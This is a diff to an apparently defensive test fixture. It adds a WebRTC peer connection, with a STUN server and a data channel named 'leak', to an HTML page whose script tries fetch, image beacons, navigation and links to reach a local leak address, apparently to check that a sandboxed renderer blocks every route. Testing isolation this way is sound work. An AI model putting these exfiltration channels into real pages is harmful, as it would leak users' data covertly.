@@ -263,13 +263,19 @@ const JIG = 'Here is a jig:\n\n```abc\nX:1\nT:The Legacy Jig\nM:6/8\nL:1/8\nQ:3/
 const DECK = 'Here are your slides:\n\n```marp\n---\npaginate: true\nfooter: Bakery · 2027\n---\n\n<!-- _class: lead -->\n# A second oven\n\n---\n\n## What it costs\n\n<!-- Say it pays back in 14 months. -->\n\n| | Cost |\n|---|---:|\n| Oven | €18,000 |\n\n---\n\n<!-- _class: invert -->\n## Paid back in 14 months\n```\n\nThree slides on the new oven.'
 const PLAN = '# Bakery plan\n\n1. Bake 120 croissants\n2. Deliver them\n\n| Day | Croissants |\n|---|---:|\n| Saturday | 120 |'
 /** A page with a style, and a script that tries every way out with what it holds: none may reach the leak address. It can fill the screen and save its prices, by a link or from its code (D158). */
-const PAGE = `<!doctype html><title>Bakery</title><style>h1 { color: rgb(180, 70, 20) }</style><h1>Bakery</h1><p id="out">Waiting</p>
+const PAGE = `<!doctype html><title>Bakery</title><style>h1 { color: rgb(180, 70, 20) }</style><h1>Bakery</h1><p id="out">Waiting</p><p id="call"></p>
 <a id="away" href="http://127.0.0.1:4182/leak?link">Away</a> <button id="go">Go</button>
 <button id="big">Big</button> <a id="keep" download="Prices.csv" href="data:text/csv,Croissant%2C2">Keep</a> <button id="export">Export</button>
 <script>document.getElementById('out').textContent = 'Baked by a script ' + document.compatMode
 const leak = 'http://127.0.0.1:4182/leak?'
 fetch(leak + 'fetch').catch(() => {})
 new Image().src = leak + 'image'
+try {
+  const call = new RTCPeerConnection({ iceServers: [{ urls: 'stun:127.0.0.1:4182' }] })
+  call.createDataChannel('leak')
+  call.createOffer().then((offer) => call.setLocalDescription(offer))
+  document.getElementById('call').textContent = 'Calling'
+} catch (error) { document.getElementById('call').textContent = error.name }
 document.getElementById('go').onclick = () => { location.href = leak + 'navigate' }
 const out = (text) => { document.getElementById('out').textContent = text }
 document.getElementById('big').onclick = () => document.body.requestFullscreen().then(() => document.exitFullscreen()).then(() => out('Full screen'), (error) => out(error.name))
